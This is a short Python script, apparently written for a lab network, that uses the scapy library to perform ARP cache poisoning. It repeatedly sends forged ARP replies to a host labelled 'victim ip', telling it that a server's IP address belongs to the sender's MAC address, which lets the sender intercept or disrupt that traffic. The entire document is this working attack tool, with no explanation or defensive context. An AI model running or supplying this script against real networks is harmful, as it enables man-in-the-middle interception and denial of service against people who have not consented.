import os
import sys
from scapy.all import get_if_hwaddr,getmacbyip,ARP,Ether,sendp

def main():
    interface = "ens33"
    target = "192.168.235.143" #victim ip
    messip = "192.168.235.142" #original server ip

    try:
        if os.geteuid() != 0:
            print("[-] Run me as root")
            sys.exit(1)
    except Exception:
        print(Exception)

    mac = get_if_hwaddr(interface)
    target_mac = getmacbyip(target)
    if target_mac is None:
        print("[-] Error: Could not resolve targets MAC address")
        sys.exit(1)
    pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=messip, hwdst=target_mac, pdst=target, op=2)

    while True:
        sendp(pkt, inter=2, iface=interface)

if __name__ == '__main__':
    main()
